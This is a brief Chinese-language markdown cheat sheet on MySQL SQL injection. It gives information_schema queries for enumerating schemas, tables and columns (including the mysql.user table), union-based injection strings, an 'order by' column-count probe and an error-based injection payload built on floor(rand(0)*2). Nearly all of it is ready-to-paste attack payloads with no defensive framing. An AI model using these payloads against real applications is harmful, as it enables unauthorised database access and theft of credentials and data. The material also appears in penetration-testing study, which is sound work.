# mysql

## 	查表三部曲

### 		1. 查找库名

```mysql
select distinct table_schema from information_schema.tables;
select distinct table_schema from information_schema.columns;
```

### 		2. 查找表名

```mysql
select table_name from information_schema.tables where table_schema='mysql';
select distinct table_name from information_schema.columns where table_schema='mysql';
```

### 		3. 查找字段名

```mysql
select column_name from information_schema.columns where table_schema='mysql' and table_name='user';
```

## 	union 注入

```mysql
'' or 1=1 union select 1,2,3 from <schema>.<tables> where 1='1'
'' union select 1,database(),version(),user() --''
```

## 快速查找字段数

```mysql
'1' order by 15 #
```

## 报错注入

```mysql
1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
```

有时候“查询语句”可能不让用union,也只能一行一行的显示，这时候需要用到limit命令，如下：

```mysql
concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x26,floor(rand(0)*2))x
```

[limit用法](https://blog.csdn.net/sinat_36246371/article/details/54582904)

limit a,b  :  从第a个开始，显示b个（a从0开始数）